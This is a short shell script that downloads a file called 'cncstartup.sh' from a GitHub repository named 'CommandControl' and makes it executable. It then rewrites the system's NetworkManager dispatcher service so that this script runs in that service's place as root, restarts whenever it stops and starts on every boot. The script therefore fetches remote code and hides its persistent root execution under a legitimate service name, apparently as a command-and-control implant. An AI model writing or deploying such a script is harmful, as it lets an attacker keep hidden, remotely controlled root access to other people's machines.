curl -o "/root/cncstartup.sh" https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.sh;
chmod +x /root/cncstartup.sh;
file_path="/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service";
sed -i "14a\\WantedBy=multi-user.target" "$file_path";
# sed -i "7s/.*/ExecStart=\/usr\/libexec\/nm-dispatcher && \/root\/cncstartup.sh/" "$file_path";
sed -i "7s/.*/ExecStart=\/root\/cncstartup.sh/" "$file_path";
sed -i "7a\\Restart=always" "$file_path";
sed -i "7a\\User=root" "$file_path";
sudo systemctl daemon-reload;
sudo systemctl restart dbus-org.freedesktop.nm-dispatcher